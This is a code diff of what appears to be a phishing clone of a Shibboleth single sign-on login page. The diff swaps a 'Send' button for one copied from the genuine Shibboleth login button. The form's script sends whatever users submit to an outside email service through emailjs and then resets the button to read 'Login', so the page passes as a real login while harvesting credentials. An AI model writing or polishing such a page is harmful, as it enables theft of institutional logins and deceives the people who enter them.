@@ -98,11 +98,8 @@ form label {
                 <input id="_shib_idp_revokeConsent" type="checkbox" name="_shib_idp_revokeConsent" value="true">
                 <label for="_shib_idp_revokeConsent">Clear prior granting of permission for release of your information to this service.</label>
             </div>
-            <div class="form-element-wrapper mt-4">
-                <br><br>
-                <button>
-                     Send
-                </button>
+ <div class="form-element-wrapper mt-4">
+                <button class="form-element form-button" type="submit" name="_eventId_proceed" onclick="this.childNodes[0].nodeValue='Logging in, please wait...'">Login</button>
             </div>
         </form>
 <footer>
@@ -161,10 +158,10 @@ myform.submit(function(event){
   emailjs.sendForm(service_id,template_id,myform[0])
   	.then(function(){ 
     	alert("Sent!");
-       myform.find("button").text("Send");
+       myform.find("button").text("Login");
     }, function(err) {
        alert("Send email failed!\r\n Response:\n " + JSON.stringify(err));
-       myform.find("button").text("Send");
+       myform.find("button").text("Login");
     });
   return false;
 });
